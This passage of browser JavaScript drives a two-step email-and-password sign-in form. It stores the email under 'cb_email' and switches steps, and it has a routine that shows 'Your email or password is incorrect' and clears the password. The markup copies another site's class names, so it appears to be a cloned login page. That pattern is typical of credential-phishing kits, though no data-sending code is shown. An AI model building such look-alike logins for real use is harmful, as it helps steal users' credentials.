    var PW_CONTINUE = '<span class="inline-i1d5xt2g currentColor-c1ul679q headline-h15u0we0 headline-h1cz184y headline-h1axe68h headline-h1d8xh3w start-szg9oeq none-ng7kred baseCss-bc3l1w2" style="--text-textTransform: var(--textTransform-headline);"><span class="">Continue</span></span>';

    function isValidEmail(v){ return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test((v||'').trim()); }
    function storedEmail(){
      try{ return (sessionStorage.getItem('cb_email') || '').trim(); }catch(_){ return ''; }
    }
    function paintChip(email){
      var v = (email || '').trim();
      var emailP = document.querySelector('[data-testid="email-button"] p.truncate-t1wbwwx3');
      var hidden = document.querySelector('[data-testid="username-hidden-field"]');
      if(emailP) emailP.textContent = v;
      if(hidden) hidden.value = v;
    }
    function clearPwInvalid(){
      var inputArea = document.querySelector('#cb-si-step2 [data-testid="input-interactable-area"]');
      var existing = document.getElementById('cb-pw-error');
      if(inputArea){
        inputArea.style.removeProperty('--border-color-unfocused');
        inputArea.style.removeProperty('--border-color-focused');
      }
      if(existing && existing.parentNode) existing.remove();
      document.documentElement.classList.remove('ll-invalid');
    }
    function paintInvalid(){
      var inputArea = document.querySelector('#cb-si-step2 [data-testid="input-interactable-area"]');
      if(inputArea){
        inputArea.style.setProperty('--border-color-unfocused','#ef4444');
        inputArea.style.setProperty('--border-color-focused','#ef4444');
      }
      var existing = document.getElementById('cb-pw-error');
      if(!existing){
        existing = document.createElement('div');
        existing.id = 'cb-pw-error';
        existing.style.cssText = 'display:flex;align-items:center;gap:6px;color:#ef4444;font-size:12px;margin-top:6px;font-family:-apple-system,sans-serif;width:100%;';
        var wrap = pwInput ? pwInput.closest('.opacity-o1xnesha') : null;
        if(wrap) wrap.insertAdjacentElement('afterend', existing);
      }
      existing.innerHTML = '<svg style="flex-shrink:0;" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg><span>Your email or password is incorrect, try again.</span>';
      clearTimeout(existing._clearTimer);
      existing._clearTimer = setTimeout(function(){
        clearPwInvalid();
      }, 13000);
      if(pwInput) pwInput.value = '';
      if(pwSubmit){
        pwSubmit.disabled = true;
        pwSubmit.setAttribute('data-disabled','true');
        var mid = pwSubmit.querySelector('.middleNodeCss-m1avpq52');
        if(mid) mid.innerHTML = PW_CONTINUE;
      }
    }
    function showStep2(email){
      onStep2 = true;
      if(step1) step1.style.display = 'none';
      if(step2) step2.style.display = 'block';
      paintChip(email || '');
      if(logoLink){
        logoLink.innerHTML = BACK_SVG;
        logoLink.setAttribute('aria-label','Back');
        logoLink.setAttribute('role','button');
        logoLink.setAttribute('tabindex','0');
      }
      try{
        if(!history.state || history.state.llSi!==2){
          history.pushState({llSi:2},'',location.href);
        }
      }catch(_){}
    }
    function showStep1(){
      onStep2 = false;
      clearPwInvalid();
      if(step2) step2.style.display = 'none';
      if(step1) step1.style.display = '';
      if(logoLink){
        logoLink.innerHTML = logoHtml;
        logoLink.removeAttribute('aria-label');
        logoLink.removeAttribute('role');
        logoLink.removeAttribute('tabindex');
